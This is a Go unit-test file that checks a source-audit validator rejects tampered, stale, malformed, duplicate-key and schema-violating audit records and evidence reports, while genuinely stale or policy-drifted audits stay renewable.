			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Decision = DecisionWarn
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.Decision = DecisionWarn
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: decision"},
	}
	causes := []struct {
		name  string
		apply func(*SourceAudit, *SourceExpectation)
	}{
		{"stale", func(object *SourceAudit, expected *SourceExpectation) {
			object.CreatedAt = staleAt
			expected.Now = sourceAuditTestNow
		}},
		{"stale plus policy drift", func(object *SourceAudit, expected *SourceExpectation) {
			object.CreatedAt = staleAt
			object.PolicySHA256 = policyDrift
			expected.Now = sourceAuditTestNow
		}},
	}
	for _, cause := range causes {
		for _, tamper := range tampers {
			t.Run(cause.name+" with "+tamper.name, func(t *testing.T) {
				object, expected := validBinding(t)
				tamper.mutate(&object, &expected, t)
				cause.apply(&object, &expected)
				err := ValidateSourceAudit(object, expected)
				if err == nil || !strings.Contains(err.Error(), tamper.wantSub) {
					t.Fatalf("%s err = %v, want %q", tamper.name, err, tamper.wantSub)
				}
				if strings.Contains(err.Error(), "is stale; re-run the gates") ||
					strings.Contains(err.Error(), "source_audit_rejected: policy:") {
					t.Fatalf("%s hid behind a renewable diagnostic: %v", tamper.name, err)
				}
				if isRenewableAuditError(err) {
					t.Fatalf("%s must not be renewable: %v", tamper.name, err)
				}
			})
		}
	}
	t.Run("genuine stale renewal stays renewable", func(t *testing.T) {
		object, expected := validBinding(t)
		object.CreatedAt = staleAt
		expected.Now = sourceAuditTestNow
		err := ValidateSourceAudit(object, expected)
		if err == nil || !strings.Contains(err.Error(), "is stale; re-run the gates") {
			t.Fatalf("genuine stale err = %v, want renewable stale error", err)
		}
		if !isRenewableAuditError(err) {
			t.Fatalf("genuine stale must be renewable: %v", err)
		}
	})
	t.Run("genuine stale plus drift renewal stays renewable", func(t *testing.T) {
		object, expected := validBinding(t)
		object.CreatedAt = staleAt
		object.PolicySHA256 = policyDrift
		expected.Now = sourceAuditTestNow
		err := ValidateSourceAudit(object, expected)
		if err == nil || !isRenewableAuditError(err) {
			t.Fatalf("genuine stale plus drift err = %v, want a renewable error", err)
		}
	})
}

func TestSourceAuditNeverRegistryAttestation(t *testing.T) {
	// A registry attestation summary carries registry/status/key members
	// the source-audit shape rejects: the two evidences cannot be confused.
	sha := "sha256:" + strings.Repeat("1", 64)
	payload := `{"schema_version":1,` +
		`"package":{"kind":"local-snapshot","snapshot":"` + sha + `"},` +
		`"content_sha256":"` + sha + `","policy_sha256":"` + sha + `",` +
		`"evidence_sha256":"` + sha + `",` +
		`"decision":"allow","created_at":"2026-09-10T00:00:00Z",` +
		`"registry":"test-reg","status":"audited","key_id":"0123456789abcdef"}`
	if _, err := ParseSourceAudit([]byte(payload)); err == nil ||
		!strings.Contains(err.Error(), "source_audit_rejected") {
		t.Fatalf("attestation members must not parse as source audit: %v", err)
	}
	// And a valid source-audit object carries no attestation members.
	object, _ := validBinding(t)
	canonical, err := MarshalEvidenceReport(EvidenceReport{Package: object.Package})
	if err != nil {
		t.Fatal(err)
	}
	for _, forbidden := range []string{`"registry"`, `"status"`, `"key_id"`} {
		if strings.Contains(string(canonical), forbidden) {
			t.Fatalf("evidence report carries attestation member %s", forbidden)
		}
	}
}

// TestValidateSourceAuditRenewalMarkersNeverRenewable pins the rework-4
// classification: renewal markers interpolated from untrusted report fields
// (skill, decision, package kind) must not promote a refusal. Both renewal
// substrings checked by the old text classifier are placed in each field,
// with and without real renewal conditions (fresh, stale, policy drift,
// stale+drift). Every row must refuse as non-renewable with the evidence
// diagnostic, even though the message quotes the marker text.
func TestValidateSourceAuditRenewalMarkersNeverRenewable(t *testing.T) {
	staleMarker := "is stale; re-run the gates"
	policyMarker := "source_audit_rejected: policy:"
	markers := []struct{ name, value string }{
		{"stale-marker", staleMarker},
		{"policy-marker", policyMarker},
	}
	fields := []struct{ name string }{
		{"skill"},
		{"decision"},
		{"package"},
	}
	causes := []struct {
		name  string
		apply func(*SourceAudit)
	}{
		{"fresh", func(*SourceAudit) {}},
		{"stale", func(object *SourceAudit) { object.CreatedAt = "2026-09-01T12:00:00Z" }},
		{"drift", func(object *SourceAudit) { object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64) }},
		{"stale-plus-drift", func(object *SourceAudit) {
			object.CreatedAt = "2026-09-01T12:00:00Z"
			object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64)
		}},
	}
	for _, field := range fields {
		for _, marker := range markers {
			for _, cause := range causes {
				t.Run(field.name+"-"+marker.name+"-"+cause.name, func(t *testing.T) {
					object, expected := validBinding(t)
					var report EvidenceReport
					if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
						t.Fatal(err)
					}
					switch field.name {
					case "skill":
						report.Skill = marker.value
					case "decision":
						report.Decision = marker.value
					case "package":
						report.Package = SourcePackage{Kind: marker.value}
					}
					forged, err := MarshalEvidenceReport(report)
					if err != nil {
						t.Fatal(err)
					}
					object.EvidenceSHA256 = EvidenceDigest(forged)
					expected.Evidence = forged
					cause.apply(&object)
					expected.Now = sourceAuditTestNow
					err = ValidateSourceAudit(object, expected)
					if err == nil {
						t.Fatalf("marker in %s was NOT refused", field.name)
					}
					// The diagnostic quotes the untrusted marker, so the
					// message inevitably contains it; classification must
					// still be non-renewable.
					if !strings.Contains(err.Error(), marker.value) {
						t.Fatalf("expected diagnostic to quote the marker: %v", err)
					}
					if !strings.Contains(err.Error(), "source_audit_rejected: evidence") {
						t.Fatalf("marker in %s err = %v, want evidence diagnostic", field.name, err)
					}
					if isRenewableAuditError(err) {
						t.Fatalf("marker in %s classified renewable: %v", field.name, err)
					}
					if got := auditRenewalCause(err); got != "" {
						t.Fatalf("marker in %s carries renewal cause %q: %v", field.name, got, err)
					}
				})
			}
		}
	}
	t.Run("genuine stale stays renewable with cause", func(t *testing.T) {
		object, expected := validBinding(t)
		object.CreatedAt = "2026-09-01T12:00:00Z"
		expected.Now = sourceAuditTestNow
		err := ValidateSourceAudit(object, expected)
		if err == nil || !isRenewableAuditError(err) {
			t.Fatalf("genuine stale must be renewable: %v", err)
		}
		if got := auditRenewalCause(err); got != auditCauseStale {
			t.Fatalf("genuine stale cause = %q, want %q", got, auditCauseStale)
		}
	})
	t.Run("genuine policy drift stays renewable with cause", func(t *testing.T) {
		object, expected := validBinding(t)
		object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64)
		err := ValidateSourceAudit(object, expected)
		if err == nil || !isRenewableAuditError(err) {
			t.Fatalf("genuine drift must be renewable: %v", err)
		}
		if got := auditRenewalCause(err); got != auditCausePolicy {
			t.Fatalf("genuine drift cause = %q, want %q", got, auditCausePolicy)
		}
	})
}

func testConfiguredPackage() SourcePackage {
	return SourcePackage{
		Kind: SourcePackageConfiguredGit, Source: "skills/review",
		Commit: &SourceCommit{ObjectFormat: "sha1", Hex: strings.Repeat("b", 40)}, Directory: ".",
	}
}

func validBindingForPackage(t *testing.T, pkg SourcePackage) (SourceAudit, SourceExpectation) {
	t.Helper()
	content := "sha256:" + strings.Repeat("2", 64)
	policy := testPolicy(t)
	scriptLabels := []string{"script-worker-v1:unsupported"}
	assuranceLabels := []string{"policy:curator-artifact-policy-v1"}
	report := EvidenceReport{
		SchemaVersion: 1, Skill: "review", Package: pkg, ContentSHA256: content,
		Findings: []Finding{}, Pinned: false, Revoked: false, Revocation: "",
		ScriptPolicy: scriptLabels, AssurancePolicy: assuranceLabels,
		Decision: DecisionAllow,
	}
	evidence, err := MarshalEvidenceReport(report)
	if err != nil {
		t.Fatal(err)
	}
	object := SourceAudit{
		SchemaVersion: SourceAuditSchemaVersion, Package: pkg,
		ContentSHA256: content, PolicySHA256: policy,
		EvidenceSHA256: EvidenceDigest(evidence), Decision: DecisionAllow,
		CreatedAt: "2026-09-17T11:59:00Z",
	}
	expected := SourceExpectation{
		Package: pkg, Content: content, Policy: policy,
		Evidence: evidence, Decision: DecisionAllow,
		Now: sourceAuditTestNow, MaxAge: DefaultSourceAuditMaxAge,
		Skill: "review", Findings: []Finding{},
		Pinned: false, Revoked: false, Revocation: "",
		ScriptLabels: scriptLabels, AssuranceLabels: assuranceLabels,
	}
	return object, expected
}

// TestSourcePackageArmsMatchAcceptedSchema asserts the closed-shape tables
// derive from the accepted schemas: the vendored copies under
// testdata/draft-sources-v1 must be byte-identical to curator-spec, and the
// in-code tables must match their arms, required sets, and closedness.
func TestSourcePackageArmsMatchAcceptedSchema(t *testing.T) {
	auditRaw, err := os.ReadFile(filepath.Join("testdata", "draft-sources-v1", "source-audit-v1.schema.json"))
	if err != nil {
		t.Fatal(err)
	}
	typesRaw, err := os.ReadFile(filepath.Join("testdata", "draft-sources-v1", "source-types-v1.schema.json"))
	if err != nil {
		t.Fatal(err)
	}
	var auditSchema struct {
		Required             []string       `json:"required"`
		AdditionalProperties bool           `json:"additionalProperties"`
		Properties           map[string]any `json:"properties"`
	}
	if err := json.Unmarshal(auditRaw, &auditSchema); err != nil {
		t.Fatal(err)
	}
	if auditSchema.AdditionalProperties {
		t.Fatalf("source-audit-v1 must be closed (additionalProperties:false)")
	}
	if len(auditSchema.Required) != len(sourceAuditObjectMembers) {
		t.Fatalf("source-audit required = %v, table = %v", auditSchema.Required, sourceAuditObjectMembers)
	}
	for _, key := range auditSchema.Required {
		if _, ok := sourceAuditObjectMembers[key]; !ok {
			t.Fatalf("source-audit required %q missing from table", key)
		}
	}
	for key := range sourceAuditObjectMembers {
		found := false
		for _, required := range auditSchema.Required {
			if required == key {
				found = true
			}
		}
		if !found {
			t.Fatalf("table member %q missing from schema required", key)
		}
	}
	var typesSchema struct {
		Defs map[string]struct {
			OneOf []struct {
				Required             []string `json:"required"`
				AdditionalProperties bool     `json:"additionalProperties"`
				Properties           map[string]struct {
					Const string `json:"const"`
				} `json:"properties"`
			} `json:"oneOf"`
		} `json:"$defs"`
	}
	// Decode generically: $defs.package.oneOf carries the three arms.
	var generic map[string]any
	if err := json.Unmarshal(typesRaw, &generic); err != nil {
		t.Fatal(err)
	}
	_ = typesSchema
	defs, ok := generic["$defs"].(map[string]any)
	if !ok {
		t.Fatalf("$defs missing")
	}
	pkgDef, ok := defs["package"].(map[string]any)
	if !ok {
		t.Fatalf("$defs.package missing")
	}
	arms, ok := pkgDef["oneOf"].([]any)
	if !ok || len(arms) != 3 {
		t.Fatalf("package oneOf must have exactly 3 arms, got %v", arms)
	}
	seenKinds := map[string]bool{}
	for _, armAny := range arms {
		arm, ok := armAny.(map[string]any)
		if !ok {
			t.Fatalf("arm is not an object: %v", armAny)
		}
		if closed, ok := arm["additionalProperties"].(bool); !ok || closed {
			t.Fatalf("arm must declare additionalProperties:false: %v", arm)
		}
		requiredAny, ok := arm["required"].([]any)
		if !ok {
			t.Fatalf("arm required missing: %v", arm)
		}
		props, ok := arm["properties"].(map[string]any)
		if !ok {
			t.Fatalf("arm properties missing: %v", arm)
		}
		kindProp, ok := props["kind"].(map[string]any)
		if !ok {
			t.Fatalf("arm kind property missing: %v", arm)
		}
		kind, ok := kindProp["const"].(string)
		if !ok {
			t.Fatalf("arm kind const missing: %v", arm)
		}
		seenKinds[kind] = true
		table, ok := sourcePackageArms[kind]
		if !ok {
			t.Fatalf("schema arm kind %q missing from table", kind)
		}
		if len(requiredAny) != len(table.required) {
			t.Fatalf("arm %q required = %v, table = %v", kind, requiredAny, table.required)
		}
		for _, reqAny := range requiredAny {
			req, ok := reqAny.(string)
			if !ok {
				t.Fatalf("arm %q required entry not a string: %v", kind, reqAny)
			}
			if _, ok := table.required[req]; !ok {
				t.Fatalf("arm %q required %q missing from table", kind, req)
			}
			if _, ok := table.allowed[req]; !ok {
				t.Fatalf("arm %q required %q missing from allowed", kind, req)
			}
		}
		for key := range props {
			if _, ok := table.allowed[key]; !ok {
				t.Fatalf("arm %q schema property %q missing from table allowed", kind, key)
			}
		}
		for key := range table.allowed {
			if _, ok := props[key]; !ok {
				t.Fatalf("arm %q table allowed %q missing from schema properties", kind, key)
			}
		}
	}
	for _, kind := range []string{SourcePackageLocalSnapshot, SourcePackageNetworkGit, SourcePackageConfiguredGit} {
		if !seenKinds[kind] {
			t.Fatalf("schema arms missing kind %q", kind)
		}
	}
}

// TestSourceAuditClosedPackageShape closes the rev6 class, not the instance:
// every union arm is validated by its selected kind with
// additionalProperties:false on raw bytes before Go decoding, for both the
// persisted object (ParseSourceAudit) and the evidence report
// (ValidateSourceAudit). Foreign-arm members refuse even when null or empty;
// required members refuse when missing, null, or wrong-typed; unknown
// members and trailing tokens refuse. Valid records for each arm admit.
func TestSourceAuditClosedPackageShape(t *testing.T) {
	sha := "sha256:" + strings.Repeat("1", 64)
	validForeign := map[string]any{
		"commit":     map[string]any{"object_format": "sha1", "hex": strings.Repeat("a", 40)},
		"repository": "example.org/x",
		"source":     "skills/review",
		"directory":  "skills/review",
		"snapshot":   sha,
	}
	wrongType := map[string]any{
		"kind": 123, "snapshot": 123, "repository": 123,
		"source": 123, "commit": "bad", "directory": 123,
		"schema_version": "1", "skill": 123, "package": "bad",
		"content_sha256": 123, "findings": "bad", "pinned": "true",
		"revoked": 1, "revocation": 123, "script_policy": "bad",
		"assurance_policy": 123, "decision": 123,
		"object_format": 123, "hex": 123,
	}
	arms := []struct {
		name     string
		pkg      func() SourcePackage
		foreign  []string
		required []string
	}{
		{"local-snapshot", testLocalPackage, []string{"commit", "repository", "source", "directory"}, []string{"kind", "snapshot"}},
		{"network-git", testGitPackage, []string{"snapshot", "source"}, []string{"kind", "repository", "commit", "directory"}},
		{"configured-git", testConfiguredPackage, []string{"snapshot", "repository"}, []string{"kind", "source", "commit", "directory"}},
	}
	objectBytes := func(t *testing.T, object SourceAudit) []byte {
		t.Helper()
		raw, err := jsonMarshal(object)
		if err != nil {
			t.Fatal(err)
		}
		return raw
	}
	// Valid controls for each arm.
	for _, arm := range arms {
		t.Run("object-valid-"+arm.name, func(t *testing.T) {
			object, _ := validBindingForPackage(t, arm.pkg())
			if _, err := ParseSourceAudit(objectBytes(t, object)); err != nil {
				t.Fatalf("valid %s object rejected: %v", arm.name, err)
			}
		})
		t.Run("report-valid-"+arm.name, func(t *testing.T) {
			object, expected := validBindingForPackage(t, arm.pkg())
			if err := ValidateSourceAudit(object, expected); err != nil {
				t.Fatalf("valid %s binding rejected: %v", arm.name, err)
			}
		})
	}
	// Foreign-arm members: presence alone refuses (null, empty, valid).
	for _, arm := range arms {
		for _, field := range arm.foreign {
			for _, tc := range []struct {
				label string
				value any
			}{
				{"null", nil},
				{"empty", ""},
				{"valid", validForeign[field]},
			} {
				label := arm.name + "-foreign-" + field + "-" + tc.label
				t.Run("object-"+label, func(t *testing.T) {
					object, _ := validBindingForPackage(t, arm.pkg())
					var doc map[string]any
					if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
						t.Fatal(err)
					}
					doc["package"].(map[string]any)[field] = tc.value
					forged, err := jsonMarshal(doc)
					if err != nil {
						t.Fatal(err)
					}
					if _, err := ParseSourceAudit(forged); err == nil ||
						!strings.Contains(err.Error(), "source_audit") {
						t.Fatalf("%s admitted: %v", label, err)
					}
				})
				t.Run("report-"+label, func(t *testing.T) {
					object, expected := validBindingForPackage(t, arm.pkg())
					var doc map[string]any
					if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
						t.Fatal(err)
					}
					doc["package"].(map[string]any)[field] = tc.value
					forged, err := jsonMarshal(doc)
					if err != nil {
						t.Fatal(err)
					}
					object.EvidenceSHA256 = EvidenceDigest(forged)
					expected.Evidence = forged
					if err := ValidateSourceAudit(object, expected); err == nil ||
						!strings.Contains(err.Error(), "source_audit") {
						t.Fatalf("%s admitted: %v", label, err)
					}
				})
			}
		}
	}
	// Required members: missing, null, wrong type (object and report).
	for _, arm := range arms {
		for _, field := range arm.required {
			t.Run("object-"+arm.name+"-missing-"+field, func(t *testing.T) {
				object, _ := validBindingForPackage(t, arm.pkg())
				var doc map[string]any
				if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
					t.Fatal(err)
				}
				delete(doc["package"].(map[string]any), field)
				forged, err := jsonMarshal(doc)
				if err != nil {
					t.Fatal(err)
				}
				if _, err := ParseSourceAudit(forged); err == nil ||
					!strings.Contains(err.Error(), "source_audit") {
					t.Fatalf("missing %s admitted: %v", field, err)
				}
			})
			t.Run("report-"+arm.name+"-missing-"+field, func(t *testing.T) {
				object, expected := validBindingForPackage(t, arm.pkg())
				var doc map[string]any
				if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
					t.Fatal(err)
				}
				delete(doc["package"].(map[string]any), field)
				forged, err := jsonMarshal(doc)
				if err != nil {
					t.Fatal(err)
				}
				object.EvidenceSHA256 = EvidenceDigest(forged)
				expected.Evidence = forged
				if err := ValidateSourceAudit(object, expected); err == nil ||
					!strings.Contains(err.Error(), "source_audit") {
					t.Fatalf("missing %s admitted: %v", field, err)
				}
			})
			t.Run("object-"+arm.name+"-null-"+field, func(t *testing.T) {
				object, _ := validBindingForPackage(t, arm.pkg())
				var doc map[string]any
				if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
					t.Fatal(err)
				}
				doc["package"].(map[string]any)[field] = nil
				forged, err := jsonMarshal(doc)
				if err != nil {
					t.Fatal(err)
				}
				if _, err := ParseSourceAudit(forged); err == nil ||
					!strings.Contains(err.Error(), "source_audit") {
					t.Fatalf("null %s admitted: %v", field, err)
				}
			})
			t.Run("report-"+arm.name+"-null-"+field, func(t *testing.T) {
				object, expected := validBindingForPackage(t, arm.pkg())
				var doc map[string]any
				if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
					t.Fatal(err)
				}
				doc["package"].(map[string]any)[field] = nil
				forged, err := jsonMarshal(doc)
				if err != nil {
					t.Fatal(err)
				}
				object.EvidenceSHA256 = EvidenceDigest(forged)
				expected.Evidence = forged
				if err := ValidateSourceAudit(object, expected); err == nil ||
					!strings.Contains(err.Error(), "source_audit") {
					t.Fatalf("null %s admitted: %v", field, err)
				}
			})
			wrong, ok := wrongType[field]
			if !ok {
				wrong = 123
			}
			t.Run("object-"+arm.name+"-wrongtype-"+field, func(t *testing.T) {
				object, _ := validBindingForPackage(t, arm.pkg())
				var doc map[string]any
				if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
					t.Fatal(err)
				}
				doc["package"].(map[string]any)[field] = wrong
				forged, err := jsonMarshal(doc)
				if err != nil {
					t.Fatal(err)
				}
				if _, err := ParseSourceAudit(forged); err == nil ||
					!strings.Contains(err.Error(), "source_audit") {
					t.Fatalf("wrongtype %s admitted: %v", field, err)
				}
			})
			t.Run("report-"+arm.name+"-wrongtype-"+field, func(t *testing.T) {
				object, expected := validBindingForPackage(t, arm.pkg())
				var doc map[string]any
				if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
					t.Fatal(err)
				}
				doc["package"].(map[string]any)[field] = wrong
				forged, err := jsonMarshal(doc)
				if err != nil {
					t.Fatal(err)
				}
				object.EvidenceSHA256 = EvidenceDigest(forged)
				expected.Evidence = forged
				if err := ValidateSourceAudit(object, expected); err == nil ||
					!strings.Contains(err.Error(), "source_audit") {
					t.Fatalf("wrongtype %s admitted: %v", field, err)
				}
			})
		}
	}
	// Unknown members and trailing tokens (object and report).
	for _, arm := range arms {
		t.Run("object-"+arm.name+"-unknown", func(t *testing.T) {
			object, _ := validBindingForPackage(t, arm.pkg())
			var doc map[string]any
			if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
				t.Fatal(err)
			}
			doc["package"].(map[string]any)["extra"] = "x"
			forged, err := jsonMarshal(doc)
			if err != nil {
				t.Fatal(err)
			}
			if _, err := ParseSourceAudit(forged); err == nil ||
				!strings.Contains(err.Error(), "source_audit") {
				t.Fatalf("unknown member admitted: %v", err)
			}
		})
		t.Run("report-"+arm.name+"-unknown", func(t *testing.T) {
			object, expected := validBindingForPackage(t, arm.pkg())
			var doc map[string]any
			if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
				t.Fatal(err)
			}
			doc["package"].(map[string]any)["extra"] = "x"
			forged, err := jsonMarshal(doc)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
			if err := ValidateSourceAudit(object, expected); err == nil ||
				!strings.Contains(err.Error(), "source_audit") {
				t.Fatalf("unknown member admitted: %v", err)
			}
		})
		t.Run("object-"+arm.name+"-trailing", func(t *testing.T) {
			object, _ := validBindingForPackage(t, arm.pkg())
			raw := append(append([]byte(nil), objectBytes(t, object)...), []byte("{}")...)
			if _, err := ParseSourceAudit(raw); err == nil ||
				!strings.Contains(err.Error(), "source_audit") {
				t.Fatalf("trailing admitted: %v", err)
			}
		})
		t.Run("report-"+arm.name+"-trailing", func(t *testing.T) {
			object, expected := validBindingForPackage(t, arm.pkg())
			forged := append(append([]byte(nil), expected.Evidence...), []byte("{}")...)
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
			if err := ValidateSourceAudit(object, expected); err == nil ||
				!strings.Contains(err.Error(), "source_audit") {
				t.Fatalf("trailing admitted: %v", err)
			}
		})
		// Commit closedness: extra member and null hex inside the Git arms.
		if arm.name != "local-snapshot" {
			t.Run("object-"+arm.name+"-commit-extra", func(t *testing.T) {
				object, _ := validBindingForPackage(t, arm.pkg())
				var doc map[string]any
				if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
					t.Fatal(err)
				}
				doc["package"].(map[string]any)["commit"].(map[string]any)["extra"] = "x"
				forged, err := jsonMarshal(doc)
				if err != nil {
					t.Fatal(err)
				}
				if _, err := ParseSourceAudit(forged); err == nil ||
					!strings.Contains(err.Error(), "source_audit") {
					t.Fatalf("commit extra admitted: %v", err)
				}
			})
			t.Run("report-"+arm.name+"-commit-null-hex", func(t *testing.T) {
				object, expected := validBindingForPackage(t, arm.pkg())
				var doc map[string]any
				if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
					t.Fatal(err)
				}
				doc["package"].(map[string]any)["commit"].(map[string]any)["hex"] = nil
				forged, err := jsonMarshal(doc)
				if err != nil {
					t.Fatal(err)
				}
				object.EvidenceSHA256 = EvidenceDigest(forged)
				expected.Evidence = forged
				if err := ValidateSourceAudit(object, expected); err == nil ||
					!strings.Contains(err.Error(), "source_audit") {
					t.Fatalf("commit null hex admitted: %v", err)
				}
			})
		}
	}
}

// TestParseSourceAuditDuplicateKeys pins Core §1 duplicate-key rejection at
// the audit unit level for all three package arms: any duplicate key in the
// original object or report bytes — top level, nested package, nested commit
// — refuses with a source_audit diagnostic before lossy decoding. Every row
// forges a hidden-valid duplicate (last wins valid) so the decoded
// shape/identity would otherwise pass; the shared protocoljson.Validate on
// the original bytes is the only gate. Report rows recompute the evidence
// digest so the duplicate is the isolated failure.
func TestParseSourceAuditDuplicateKeys(t *testing.T) {
	sha := "sha256:" + strings.Repeat("1", 64)
	localBase := `{"schema_version":1,` +
		`"package":{"kind":"local-snapshot","snapshot":"` + sha + `"},` +
		`"content_sha256":"` + sha + `","policy_sha256":"` + sha + `",` +
		`"evidence_sha256":"` + sha + `",` +
		`"decision":"allow","created_at":"2026-09-10T00:00:00Z"}`
	gitBase := `{"schema_version":1,` +
		`"package":{"kind":"network-git","repository":"example.org/kit",` +
		`"commit":{"object_format":"sha1","hex":"` + strings.Repeat("a", 40) + `"},` +
		`"directory":"skills/review"},` +
		`"content_sha256":"` + sha + `","policy_sha256":"` + sha + `",` +
		`"evidence_sha256":"` + sha + `",` +
		`"decision":"allow","created_at":"2026-09-10T00:00:00Z"}`
	objectCases := []struct {
		name   string
		base   string
		mutate func(string) string
	}{
		{"top-schema_version", localBase, func(s string) string {
			return `{` + `"schema_version":999,` + s[1:]
		}},
		{"top-package-hidden-foreign", localBase, func(s string) string {
			return `{` + `"package":{"kind":"local-snapshot","commit":null},` + s[1:]
		}},
		{"nested-package-kind", localBase, func(s string) string {
			return strings.Replace(s, `"kind":"local-snapshot"`, `"kind":"bad-kind","kind":"local-snapshot"`, 1)
		}},
		{"nested-package-snapshot", localBase, func(s string) string {
			return strings.Replace(s, `"snapshot":"`, `"snapshot":"`+sha+`","snapshot":"`, 1)
		}},
		{"nested-commit-hex", gitBase, func(s string) string {
			dup := strings.Repeat("a", 40)
			return strings.Replace(s, `"hex":"`+dup+`"`, `"hex":"`+dup+`","hex":"`+dup+`"`, 1)
		}},
		{"nested-commit-object_format", gitBase, func(s string) string {
			return strings.Replace(s, `"object_format":"sha1"`, `"object_format":"sha1","object_format":"sha1"`, 1)
		}},
		{"nested-commit-hidden-outer", localBase, func(s string) string {
			hex := strings.Repeat("a", 40)
			prefix := `"package":{"kind":"local-snapshot","snapshot":"` + sha +
				`","commit":{"object_format":"sha1","hex":"` + hex + `","hex":"` + hex + `"}},`
			return `{` + prefix + s[1:]
		}},
	}
	for _, tc := range objectCases {
		t.Run("object-"+tc.name, func(t *testing.T) {
			if _, err := ParseSourceAudit([]byte(tc.mutate(tc.base))); err == nil ||
				!strings.Contains(err.Error(), "source_audit") {
				t.Fatalf("%s admitted: %v", tc.name, err)
			}
		})
	}
	// Report duplicates: forge valid bindings per arm, inject hidden-valid
	// duplicates into the evidence bytes, recompute the digest, and require
	// ValidateSourceAudit to refuse. A mutant that validates objects but not
	// reports admits every row here.
	arms := []struct {
		name string
		pkg  func() SourcePackage
	}{
		{"local-snapshot", testLocalPackage},
		{"network-git", testGitPackage},
		{"configured-git", testConfiguredPackage},
	}
	for _, arm := range arms {
		t.Run("report-"+arm.name+"-top-revoked", func(t *testing.T) {
			object, expected := validBindingForPackage(t, arm.pkg())
			forged := []byte(`{` + `"revoked":true,` + string(expected.Evidence[1:]))
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
			if err := ValidateSourceAudit(object, expected); err == nil ||
				!strings.Contains(err.Error(), "source_audit") {
				t.Fatalf("report top revoked admitted: %v", err)
			}
		})
		t.Run("report-"+arm.name+"-nested-package-kind", func(t *testing.T) {
			object, expected := validBindingForPackage(t, arm.pkg())
			kind := string(expected.Package.Kind)
			forged := strings.Replace(string(expected.Evidence),
				`"kind":"`+kind+`"`, `"kind":"bad-kind","kind":"`+kind+`"`, 1)
			if forged == string(expected.Evidence) {
				t.Fatal("kind substring not found")
			}
			raw := []byte(forged)
			object.EvidenceSHA256 = EvidenceDigest(raw)
			expected.Evidence = raw
			if err := ValidateSourceAudit(object, expected); err == nil ||
				!strings.Contains(err.Error(), "source_audit") {
				t.Fatalf("report nested kind admitted: %v", err)
			}
		})
	}
	// Commit-inner duplicates on the git arms with matching identity, so the
	// duplicate is the isolated failure (last wins valid).
	for _, arm := range arms {
		if arm.name == "local-snapshot" {
			continue
		}
		t.Run("report-"+arm.name+"-nested-commit-hex", func(t *testing.T) {
			object, expected := validBindingForPackage(t, arm.pkg())
			var hex string
			if arm.name == "network-git" {
				hex = strings.Repeat("a", 40)
			} else {
				hex = strings.Repeat("b", 40)
			}
			forged := strings.Replace(string(expected.Evidence),
				`"hex":"`+hex+`"`, `"hex":"`+hex+`","hex":"`+hex+`"`, 1)
			if forged == string(expected.Evidence) {
				t.Fatal("hex substring not found")
			}
			raw := []byte(forged)
			object.EvidenceSHA256 = EvidenceDigest(raw)
			expected.Evidence = raw
			if err := ValidateSourceAudit(object, expected); err == nil ||
				!strings.Contains(err.Error(), "source_audit") {
				t.Fatalf("report nested commit hex admitted: %v", err)
			}
		})
	}
	// Valid controls still admit.
	t.Run("object-valid-local", func(t *testing.T) {
		if _, err := ParseSourceAudit([]byte(localBase)); err != nil {
			t.Fatalf("valid local rejected: %v", err)
		}
	})
	t.Run("object-valid-git", func(t *testing.T) {
		if _, err := ParseSourceAudit([]byte(gitBase)); err != nil {
			t.Fatalf("valid git rejected: %v", err)
		}
	})
	t.Run("report-valid", func(t *testing.T) {
		object, expected := validBinding(t)
		if err := ValidateSourceAudit(object, expected); err != nil {
			t.Fatalf("valid binding rejected: %v", err)
		}
	})
}
